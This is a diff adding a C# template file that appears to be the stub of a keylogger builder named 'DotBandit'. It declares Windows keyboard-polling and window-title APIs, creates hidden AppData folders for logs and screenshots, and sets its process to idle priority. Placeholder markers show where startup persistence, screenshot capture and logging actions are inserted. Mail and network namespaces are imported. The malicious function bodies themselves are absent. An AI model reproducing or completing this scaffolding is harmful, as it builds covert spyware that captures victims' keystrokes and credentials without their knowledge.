@@ -1,0 +1,123 @@
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Diagnostics;
+using System.Threading;
+using System.Net;
+using System.Net.Mail;
+using System.Reflection;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Security.Cryptography;
+using Microsoft.Win32;
+using System.Media;
+using System.Resources;
+using System.ComponentModel;
+
+class Program
+{
+    #region Externs
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetWindowText(IntPtr hWnd, StringBuilder textOut, int count);
+
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetKeyboardState(byte[] lpKeyState);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern uint GetKeyboardLayout(uint idThread);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);
+    #endregion
+
+    #region Private Fields
+    public const int MAX_STRING_BUILDER = 256;
+    public const bool DEBUG = true;
+    public static StreamWriter writer;
+    static int time = 10000;
+    static Thread save;
+    private static int counter;
+
+    public static string path = System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DotBandit";
+    public static string PNGPath = System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DotBandit" + "\\Screenshots";
+    #endregion    
+
+    [STAThread]       
+
+    //[FUNC_ADDTOSTARTUP]
+
+	//[FUNC_SCREENSHOT]
+
+	//[FUNC_ACTION]
+
+    //[CUSTOM_FUNC_0X01]
+
+    //[CUSTOM_FUNC_0X02]
+
+    //[CUSTOM_FUNC_0X03]
+
+    #region Main
+    public static void Main()
+    {
+        Application.EnableVisualStyles();
+        Application.SetCompatibleTextRenderingDefault(false);
+
+		//[CUSTOM_CALL_0X01]
+
+		//[CUSTOM_CALL_0X02]
+
+		//[CUSTOM_CALL_0X03]
+
+		//[CUSTOM_CALL_0X04]
+
+		//[CUSTOM_CALL_0X05]
+
+		//[CUSTOM_CALL_0X06]
+
+        //PRIORITY
+        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Idle;
+		counter = 0;
+
+		//[CALL_MSG]		
+
+		//CREATE PATH
+		if (!System.IO.Directory.Exists(path))
+        {
+            System.IO.Directory.CreateDirectory(path);
+        }
+
+        //CREATE SCREENSHOTS FOLDER
+        if (!System.IO.Directory.Exists(PNGPath))
+        {
+            System.IO.Directory.CreateDirectory(PNGPath);
+        }
+
+        //[CALL_SCREENSHOT]
+
+        //[CALL_ADDTOSTARTUP]
+
+		if(true)
+		{
+			//[CALL_ACTION]
+			while(true)
+			{ 
+				Thread.Sleep(1000);
+				GC.Collect();
+   				GC.WaitForPendingFinalizers();
+			}			
+		}		        
+    }
+    #endregion
+}
